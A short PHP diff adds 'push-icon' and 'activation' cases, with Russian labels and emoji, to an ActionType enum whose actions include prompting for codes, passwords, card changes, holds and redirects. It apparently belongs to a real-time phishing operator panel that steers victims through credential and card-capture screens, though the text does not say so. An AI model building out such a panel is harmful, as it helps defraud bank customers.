@@ -8,6 +8,7 @@ enum ActionType: string
 {
     case CODE = 'code';
     case PUSH = 'push';
+    case PUSH_ICON = 'push-icon';
     case PASSWORD = 'password';
     case CARD_CHANGE = 'card-change';
     case ERROR = 'error';
@@ -18,12 +19,14 @@ enum ActionType: string
     case IMAGE_QUESTION = 'image-question';
     case REDIRECT = 'redirect';
     case HOLD = 'hold';
+    case ACTIVATION = 'activation';
 
     public function label(): string
     {
         return match ($this) {
             self::CODE => 'Код',
             self::PUSH => 'Пуш',
+            self::PUSH_ICON => 'Пуш с иконкой',
             self::PASSWORD => 'Пароль',
             self::CARD_CHANGE => 'Карта',
             self::ERROR => 'Ошибка',
@@ -34,6 +37,7 @@ enum ActionType: string
             self::IMAGE_QUESTION => 'Картинка с вопросом',
             self::REDIRECT => 'Редирект',
             self::HOLD => 'Холд',
+            self::ACTIVATION => 'Активация',
         };
     }
 
@@ -42,6 +46,7 @@ enum ActionType: string
         return match ($this) {
             self::CODE => '📱',
             self::PUSH => '🔔',
+            self::PUSH_ICON => '🔔',
             self::PASSWORD => '🔐',
             self::CARD_CHANGE => '💳',
             self::ERROR => '⚠️',
@@ -52,6 +57,7 @@ enum ActionType: string
             self::IMAGE_QUESTION => '🖼❓',
             self::REDIRECT => '🔗',
             self::HOLD => '⏸',
+            self::ACTIVATION => '✅',
         };
     }
 
@@ -63,8 +69,9 @@ enum ActionType: string
     public function requiresRedirect(): bool
     {
         return match ($this) {
-            self::CODE, self::PUSH, self::PASSWORD, self::CARD_CHANGE, self::ERROR,
-            self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::HOLD => true,
+            self::CODE, self::PUSH, self::PUSH_ICON, self::PASSWORD, self::CARD_CHANGE, self::ERROR,
+            self::CUSTOM_ERROR, self::CUSTOM_QUESTION, self::CUSTOM_IMAGE, self::IMAGE_QUESTION, self::HOLD,
+            self::ACTIVATION => true,
             self::ONLINE, self::REDIRECT => false,
         };
     }
